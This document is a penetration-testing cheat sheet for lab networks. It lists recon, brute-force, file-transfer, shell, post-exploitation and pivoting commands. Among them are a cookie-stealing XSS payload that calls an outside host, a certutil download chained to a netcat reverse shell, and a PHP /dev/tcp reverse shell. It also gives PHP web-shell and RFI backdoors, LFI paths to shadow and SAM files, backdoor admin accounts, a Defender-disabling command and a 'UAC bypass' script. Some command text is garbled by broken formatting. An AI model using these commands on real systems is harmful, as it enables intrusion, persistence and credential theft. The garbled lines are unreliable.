# Cheat Sheet

## ENUMERATION

All around scanner

> $ python3 [autorecon.py](http://autorecon.py) &gt; $ip -v

Host Discovery

> $ nmap -sn 10.11.1.1-254 -vv -oA hosts  
> $ netdiscover -r 10.11.1.0/24  
> $ crackmapexec 192.168.10.0/24  
> $ arp-scan --interface=eth0 192.168.0.0/24

DNS server discovery

> $ nmap -p 53 10.11.1.1-254 -vv -oA dcs

## PORT

Port Scanning & Service Detection

> $ unicornscan -mT -I 10.11.1.252:a -v  
> $ unicornscan -mU -I 10.11.1.252:p -v  
> $ nmap -sC -sV -Pn -oA -vv standard\_tcp &gt; $ip $ nmap -sC -sV -sU -Pn -oA -vv standard\_udp &gt; $ip $ nmap -p -sU -sT -Pn 0-65535 -vv -oN all\_ports &gt; $ip $ unicornscan -mU -I 192.168.24.53:a -v -l unicorn\_full\_udp.txt ; unicornscan -mT -I 192.168.24.53:a -v -l unicorn\_full\_tcp.txt

Vulnerability Scanning

> $nmap -Pn -sT -sU -p &gt; $ports --script=\*vuln\* -vv -oN nmap\_vuln &gt; $ip

Banner Grabbing

> $ nc -nv &gt; $ip &gt; $port

## DNS

Find DNS server:

> $ nslookup thinc.local 10.11.1.221  
> $ dig @10.11.1.221 thinc.local

Forward Lookup Brute Force:

> $ dnsrecon -d [example.com](http://example.com) -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml

Reverse Lookup Brute Force:

> $ dnsrecon -d [demo.com](http://demo.com) -t rvl

DNS Zone Transfers:

> $ host -l domain &gt; $ip $ dnsrecon -d [megacorpone.com](http://megacorpone.com) -t axfr  
> $ dnsenum [zonetransfer.me](http://zonetransfer.me)

## FTP

Vulnerability Scanning

> $ nmap -p 21 --script="+\*ftp\* and not brute and not dos and not fuzzer" -vv -oN ftp &gt; $ip

Deafult Creds

> $ hydra -s 21 -C /usr/share/sparta/wordlists/ftp-default-userpass.txt -u -f &gt; $ip ftp

## FTP MANUAL SCANS

Anonymous login

Enumerate the hell out of the machine!

> $ OS version  
> $ Other software you can find on the machine \(Prog Files, yum.log, /bin\)  
> $ password files  
> $ DLLs for msfpescan / BOF targets

Do you have UPLOAD potential?

> $ Can you trigger execution of uploads?  
> $ Swap binaries?

Public exploits for ftp server software

## HTTP\(S\)

Vulnerability Scanning

> $ nmap -p 80,443 --script="+\*http\* and not brute and not dos and not fuzzer" -vv -oN http\(s\) &gt; $ip $ Nikto -port 80,443 -host &gt; $ip -o -v nikto.txt or $ nikto -Option USERAGENT=Mozilla -url=[http://10.11.1.24](http://10.11.1.24) -o nikto.txt

Directories

> $ gobuster dir -u [https://10.11.1.35](https://10.11.1.35) -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -k -o gobuster

Word Press

> $ wpscan --url [http://10.11.1.251/wp](http://10.11.1.251/wp)

## MANUAL HTTP SCANS

Check the source code

Technologies used

> $whatweb &gt; $ip:80 --color=never --log-brief="whattheweb.txt"

curl -s \[http:// &gt; $ip/robots.txt\]\(http:// &gt; $ip/robots.txt\)

Burp

> $ get params  
> $ post params  
> $ cookies  
> $ user agents  
> $ referrers  
> $ all the headers  
> $ change get requests to posts  
> $ take note of all error codes  
> $ fuzz parameter values, and names, etc.

Things to be on look for:

> $ Default credentials for software  
> $ SQL-injectable GET/POST params  
> $ XSS  
> Test  
> $ &lt;script&gt; alert\("Hello! I am an alert box!!"\);&lt;/script&gt;  
> $ &lt;iframe SRC="http:10.11.0.106/xss\_test.html" height = "0" width ="0"&gt;&lt;/iframe&gt;  
> Exploit  
> $ &lt;script&gt;new Image\(\).src="[http://10.11.0.106/bogus.php?output=](http://10.11.0.106/bogus.php?output=)"+document.cookie;&lt;/script&gt;  
> $ LFI/RFI through ?page=foo type params  
> LFI:  
> $ /etc/passwd \| /etc/shadow insta-win  
> $ /var/www/html/config.php or similar paths to get SQL etc creds  
> $ ?page=php://filter/convert.base64-encode/resource=../config.php  
> $ ../../../../../boot.ini to find out windows version  
> RFI:  
> $ Have your PHP/cgi downloader ready  
> $ &lt;?php include \_GET\\['inc'\\]; ?&gt; simplest backdoor to keep it dynamic without anything messing your output &gt; $ Then you can just [http://IP/inc.php?inc=http://](http://IP/inc.php?inc=http://) &gt; $YOURIP/bg.php and have full control with minimal footprint on target machine $ get phpinfo\(\)

HTTPS

> $ Heartbleed / CRIME / Other similar attacks  
> $ Read the actual SSL CERT to:  
> $ find out potential correct vhost to GET  
> $ is the clock skewed  
> $ any names that could be usernames for bruteforce/guessing

LFI Linux Files:

> $ /etc/issue  
> $ /proc/version  
> $ /etc/profile  
> $ /etc/passwd  
> $ /etc/shadow  
> $ /root/.bash\_history  
> $ /var/mail/root  
> $ /var/spool/cron/crontabs/root  
> $ /etc/sysconfig/iptables  
> $ /etc/sysconfig/ip6tables

LFI Windows Files:

> $ %SYSTEMROOT%\repair\system  
> $ %SYSTEMROOT%\repair\SAM  
> $ %SYSTEMROOT%\repair\SAM  
> $ %WINDIR%\win.ini  
> $ %SYSTEMDRIVE%\boot.ini  
> $ %WINDIR%\Panther\sysprep.inf  
> $ %WINDIR%\system32\config\AppEvent.Evt  
> $ c:\windows\system32\drivers\etc\hosts

## MYSQL

Vulnerability Scanning

> $ nmap -p 3306 --script="+\*mysql\* and not brute and not dos and not fuzzer" -vv -oN mysql &gt; $ip

Deafult Creds

> $ hydra -s 3306 -C /usr/share/sparta/wordlists/mysql-default-userpass.txt -u -f &gt; $ip ftp

Public Exploit

## RPC

Find NFS Port

> $ nmap -p 111 --script=rpcinfo.nse -vv -oN nfs\_port &gt; $ip

Services Running

> $ rpcinfo –p &gt; $ip $ rpcbind -p rpcinfo –p x.x.x.x

Null Session/User Rpc login

> $ rpcclient -U "" &gt; $ip  
> ▪ srvinfo  
> ▪ enumdomusers  
> ▪ enumprivs  
> ▪ enumalsgroups domain  
> ▪ lookupnames administrators  
> ▪ querydominfo  
> ▪ enumdomusers  
> ▪ queryuser john

## NFS

Show Mountable NFS Shares

> $ nmap --script=nfs-showmount -oN mountable\_shares &gt; $ip $ showmount -e &gt; $ip

List NFS exported shares. If 'rw,no\_root\_squash' is present, upload and execute sid-shell

> $ chown root:root sid-shell; chmod +s sid-shell

## POP3

Enumerating user accounts

> $ nc -nv &gt; $ip 25 $ VRFY user  
> $ USER user  
> $ EXPN user

## SMB&NETBIOS

Over All scan

> $ enum4linux -a &gt; $ip

Guest User and null authentication

> $ smbmap -u anonymous -p anonymous -H 10.10.10.172  
> $ smbmap -u '' -p '' -H 10.10.10.172

Vulnerability Scanning

> $ nmap --script="+\*smb\* and not brute and not dos and not fuzzer" -p 139,445 -oN smb-vuln &gt; $ip

Enumerate Hostnames

> $ nmblookup -A &gt; $ip

List Shares with no creds and guest account

> $ smbmap -H \[ip/hostname\] -u anonymous -p hokusbokus -R  
> $ nmap --script smb-enum-shares -p 139,445 &gt; $ip

List Shares with creds

> $ smbmap -H \[ip\] -d \[domain\] -u \[user\] -p \[password\] -r --depth 5 -R

Connect to share

> $ smbclient \\\\[ip\]\\\[share name\]

Netbios Information Scanning

> $ nbtscan -r &gt; $ip/24

Nmap find exposed Netbios servers

> $ nmap -sU --script nbstat.nse -p 137 &gt; $ip

Mount smb share:

> $ mount -t cifs //&lt;server ip&gt;/&lt;share&gt; &lt;local dir&gt; -o username=”guest”,password=””

## SNMP

Enumeration Tools

> $ Onesixtyone – c &lt;community list file&gt; -I &lt;ip-address&gt;  
> $ Snmpwalk -c &lt;community string&gt; -v&lt;version&gt; &gt; $ip 1.3.6.1.2.1.25.4.2.1.2 $ snmp-check &gt; $ip

Default Community Names:

> $ public, private, cisco, manager

Enumerate MIB:

> $ 1.3.6.1.2.1.25.1.6.0 System Processes  
> $ 1.3.6.1.2.1.25.4.2.1.2 Running Programs  
> $ 1.3.6.1.2.1.25.4.2.1.4 Processes Path  
> $ 1.3.6.1.2.1.25.2.3.1.4 Storage Units  
> $ 1.3.6.1.2.1.25.6.3.1.2 Software Name  
> $ 1.3.6.1.4.1.77.1.2.25 User Accounts  
> $ 1.3.6.1.2.1.6.13.1.3 TCP Local Ports

SNMP V3

> $ nmap -p 161 --script=snmp-info &gt; $ip $ default creds:  
> ▪ /usr/share/metasploit-framework/data/wordlists/snmp\_default\_pass.txt

## DOMAIN

Leak DC hostname:

> $ noslookup  
> server 10.10.10.172  
> set type=ns  
> 10.10.10.172  
> 127.0.0.1

Nmap:

> $ nmap -p 53 --script=\*dns\* -vv -oN dns &gt; $ip

## LDAP/Active Directory

--Look for anonymous bind

> $ ldapsearch -x -b "dc=megabank,dc=local" "\*" -h &gt; $ip

## FILE TRANSFER

Simple Servers:

> $ python -m SimpleHTTPServer 80  
> $ python -m pyftpdlib -p 21 -w -d /tmp  
> $ ptftpd -p 69 -v eth0 /tmp  
> $ impacket-smbserver -username guest -password guest -smb2support share &gt; $\(pwd\) // Might need to remove -smb2support option

Tools:

> $ Linux & Windows \( Newer Windows versions only \)  
> ▪ wget [http://10.11.0.106/nc.exe](http://10.11.0.106/nc.exe) -O nc.exe  
> ▪ curl [http://10.11.0.106/nc.exe](http://10.11.0.106/nc.exe) -o nc.exe  
> $ Windows \( Should work on most Windows versions\)  
> ▪powershell \(New-Object System.Net.WebClient\).DownloadFile\("[https://10.10.10.144/test.txt](https://10.10.10.144/test.txt)", "test.txt"\)  
> ▪net use Z: \\computer\_name\share\_name //Mount smb share  
> ▪ &gt; $pass= "guest" \| ConvertTo-SecureString -AsPlainText -Force $cred = New-Object System.Management.Automation.PsCredential\('guest', &gt; $pass\)  
> New-PSDrive -name guest -root \\10.10.15.53\share -Credential &gt; $cred -PSProvider "filesystem"  
> ▪certutil.exe -urlcache -split -f "[http://10.11.0.106:8000/nc.exe](http://10.11.0.106:8000/nc.exe)" nc.exe && nc.exe -nv 10.11.0.106 443 -e cmd.exe  
> ▪VBscript  
> → echo strUrl = WScript.Arguments.Item\(0\) &gt; wget.vbs  
> echo StrFile = WScript.Arguments.Item\(1\) &gt;&gt; wget.vbs  
> echo Const HTTPREQUEST\_PROXYSETTING\_DEFAULT = 0 &gt;&gt; wget.vbs  
> echo Const HTTPREQUEST\_PROXYSETTING\_PRECONFIG = 0 &gt;&gt; wget.vbs  
> echo Const HTTPREQUEST\_PROXYSETTING\_DIRECT = 1 &gt;&gt; wget.vbs  
> echo Const HTTPREQUEST\_PROXYSETTING\_PROXY = 2 &gt;&gt; wget.vbs  
> echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs  
> echo Err.Clear &gt;&gt; wget.vbs  
> echo Set http = Nothing &gt;&gt; wget.vbs  
> echo Set http = CreateObject\("WinHttp.WinHttpRequest.5.1"\) &gt;&gt; wget.vbs  
> echo If http Is Nothing Then Set http = CreateObject\("WinHttp.WinHttpRequest"\) &gt;&gt; wget.vbs  
> echcscript wget.vbs [http://10.11.0.6/wce32\_upx.exe](http://10.11.0.6/wce32_upx.exe) wce32\_upex.exe If http Is Nothing Then Set http = CreateObject\("MSXML2.ServerXMLHTTP"\) &gt;&gt; wget.vbs  
> echo If http Is Nothing Then Set http = CreateObject\("Microsoft.XMLHTTP"\) &gt;&gt; wget.vbs  
> echo http.Open "GET", strURL, False &gt;&gt; wget.vbs  
> echo http.Send &gt;&gt; wget.vbs  
> echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs  
> echo Set http = Nothing &gt;&gt; wget.vbs  
> echo Set fs = CreateObject\("Scripting.FileSystemObject"\) &gt;&gt; wget.vbs  
> echo Set ts = fs.CreateTextFile\(StrFile, True\) &gt;&gt; wget.vbs  
> echo strData = "" &gt;&gt; wget.vbs  
> echo strBuffer = "" &gt;&gt; wget.vbs  
> echo For lngCounter = 0 to UBound\(varByteArray\) &gt;&gt; wget.vbs  
> echo ts.Write Chr\(255 And Ascb\(Midb\(varByteArray,lngCounter + 1, 1\)\)\) &gt;&gt; wget.vbs  
> echo Next &gt;&gt; wget.vbs  
> echo ts.Close &gt;&gt; wget.vbs  
> → cscript wget.vbs [http://10.11.0.6/wce32\_upx.exe](http://10.11.0.6/wce32_upx.exe) wce32\_upx.exe  
> ▪ FTP Non interactive mode  
> → ftp -A 10.11.0.106  
> → binary  
> → GET nc.exe  
> → bye  
> ▪ TFTP  
> → tftp -i 10.11.0.106 GET exploit.exe

## SHELLS

Spawning a TTY Shell - Break out of Jail or limited shell You should almost always upgrade your shell after taking control of an apache or www user \(For example when you encounter an error message when trying to run an exploit sh: no job control in this shell \)

Interactive shell:

> $python -c 'import pty; pty.spawn\("/bin/bash"\)' $ echo os.system\('/bin/bash'\)

Adjust Interactive shell:

> $ Ctrl-Z  
> $ echo &gt; $TERM //find term $ stty raw -echo //disable shell echo  
> $ fg  
> $ reset  
> $ export SHELL=bash  
> $ export TERM=xterm

Php backdoor:

> $ &lt;?php echo shell\_exec\( &gt; $\_GET\['cmd'\]\);?&gt;

Php shell:

> $ &lt;?php echo shell\_exec\('bash -i &gt;& /dev/tcp/10.11.0.106/443 0&gt;&1'\);?&gt;  
> $

## PSSWD CRACKING

```text
> $ Look for the hash in online databases
```

Hashcat:

> $ Find mode in hashcat  
> ▪ hashcat --example hashes  
> $ hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt

John:

> $ john files --wordlist=/usr/share/wordlists/rockyou.txt

## PSSWD Mutation

Hashcat

> $ hashcat -m 0 bfield.hash /usr/share/wordlists/rockyou.txt -r rules

## PSSWD BruteForcing

Crackmapexec

> $ Enumerate password policy  
> ▪ crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS --pass-pol  
> $ Bruteforce SMB  
> ▪ crackmapexec smb 10.10.10.172 -u /root/users.lst -p /root/passwords.lst  
> $ Bruteforce winrm  
> ▪ crackmapexec winrm 10.10.10.172 -u /root/users.lst -p /root/passwords.lst

Hydra

> $ Hydra brute force against SNMP  
> ▪ hydra -P password-file.txt -v &gt; $ip snmp

```text
> $ Hydra FTP known user and rockyou password list
```

▪ hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV &gt; $ip ftp

```text
> $ Hydra SSH using list of users and passwords
```

▪ hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u &gt; $ip ssh

```text
> $ Hydra POP3 Brute Force
```

▪ hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f &gt; $ip pop3 -V

```text
> $ Hydra SMTP Brute Force
```

▪ hydra -P /usr/share/wordlistsnmap.lst &gt; $ip smtp -V

```text
> $ Hydra attack http get 401 login with a dictionary
```

▪ hydra -L ./webapp.txt -P ./webapp.txt &gt; $ip http-get /admin

```text
> $ Hydra attack Windows Remote Desktop with rockyou
```

▪ hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp:// &gt; $ip

```text
> $ Hydra brute force a Wordpress admin login
```

▪ hydra -l admin -P ./passwordlist.txt &gt; $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'

## POST EXPLOITATION LINUX

Add user with root privs:

> $ sudo useradd -ou 0 -g 0 john  
> $ sudo passwd John@1234

Combie shadow and passwd files:

> $ unshadow passwd.txt shadow.txt &gt; passwords.txt

Find listening services:

> $ netstat -alp

Copy ssh private kets:

> $ /etc/ssh/ssh\_host\_dsa\_key  
> $ /etc/ssh/ssh\_host\_key

Check interseting files

> $ /var/log  
> $ /var/log/secure  
> $ /etc/passwd  
> $ /etc/shadow  
> $ ~/.bash\_history  
> $ ~/.mysql\_history  
> Check log files of some of the services:  
> $ http  
> $ ftp  
> $ ssh  
> ▪ grep 'sshd' /var/log/auth.log

linux Post Exploitation:

> $ ifconfig

## POST EXPLOITATION WINDOWS

Backdoor User:

> $ net user backdoor backdoor@123 /add  
> $ net localgroup administrators backdoor /add  
> $ net localgroup "Remote Desktop Users" backdoor /add  
> $ net user admin newpassword  
> Enabling RDP  
> $ netsh firewall add portopening TCP 3389 "Open Port 3389" ENABLE ALL  
> $ netsh firewall set portopening TCP 3389 proxy ENABLE ALL  
> $ netsh firewall set service RemoteDesktop enable  
> $ reg add "HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG\_DWORD /d 0 /f

Disable RDP

> $ reg add "HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG\_DWORD /d 1 /f  
> $ netsh firewall delete portopening protocol=TCP port=3389

Check log files of some of the services:

> $ http  
> $ ftp  
> $ ssh

Windows Post Exploitation:

> $ Arp -a  
> $ netstat -ano  
> $ ipconfig /all  
> $ route print  
> $ schtasks /query /fo LIST /v  
> $ netsh firewall show config  
> $ Net group  
> $ Net localgroup  
> $ \(for /R ".\" %A in \(\*.txt\) do echo %~fA %~zA\) \| findstr /v "echo  
> $ Net share  
> $ Power shell to Enumerate users and computers using powershell

## USEFUL LINUX COMMANDS

Find file by name:

> $ find /home/username/ -name "\*.err"

Find writable directories:

> $ find / -perm -o+w  
> $ find . -perm -o+w -exec chmod +t {} +  
> $ find / -writable  
> $ find / -type d \\( -perm -g+w -or -perm -o+w \\) -exec ls -adl {} \; \| grep drwxrwsr

pipe to clipboard

> $ ls \| xclip -selection c

tar

> $ create  
> ▪ tar -cvf linux\_priv\_esc.tar.gz /root/Desktop  
> $ unzip  
> ▪ tar xvzf linux\_priv\_esc.tar.gz

kerbros auth

> $ xfreerdp /u:alice /v:10.11.1.50

## USEFUL WINDOWS COMMANDS

Find log files in directory

> $ dir /s \*log\*

Process

> $ tasklist  
> $ taskkill /F /PID pid\_number

Disable windows defender:

> $ sc stop WinDefend

UAC bypass:

> $ echo &gt; $username = "alice" &gt; run.ps1 $ echo &gt; $secpasswd = ConvertTo-SecureString "aliceishere" -AsPlainText -Force &gt;&gt; run.ps1  
> echo &gt; $mycreds = New-Object System.Management.Automation.PSCredential \(" &gt; $username", &gt; $secpasswd\) &gt;&gt; run.ps1 &gt; $ echo Start-Process veil\_meterpreter.bat -Credential \( &gt; $mycreds\) &gt;&gt; run.ps1

```text
> $ powershell -ExecutionPolicy Bypass -File run.ps1
```

## PIVOTING

Dynamic Port Forwading:

> $ SSH  
> ▪ ssh -D 9000 root@ &gt; $ip ▪ set proxychains.conf to 127.0.0.1 1080 ▪ proxy chains nc -nv 10.11.0.106 $ Reverse SSH from windows to my kali  
> ▪ systemctl start ssh.service  
> ▪putty.exe -ssh [root@10.11.0.106](mailto:root@10.11.0.106)

Local port forward:

```text
     > $  Explanation
         ▪ ssh -L 80:localhost:80 SUPERSERVER
         ▪ a connection made to the local port 80 is to be forwarded to port 80 on SUPERSERVER.

     > $  SSH
        ▪ ssh -R sourcePort:forwardToHost:onPort connectToHost
```

Remote port forward:

```text
      > $   Explanation
         ▪ ssh -R 80:localhost:80 tinyserver
         ▪ a connection made to the remote port 80 on tiny server is to be forwarded to port 80 on my localhost.

      > $   SSH
        ▪ ssh -L sourcePort:forwardToHost:onPort connectToHost
```

Metasploit:

> $ Dynamic Port Forwading  
> ▪ autoroute module  
> → set session to meterpreter session  
> ▪ socks4a module  
> → set srv port to \( no need to set host\)  
> ▪ set proxychains.conf to 127.0.0.1 1080

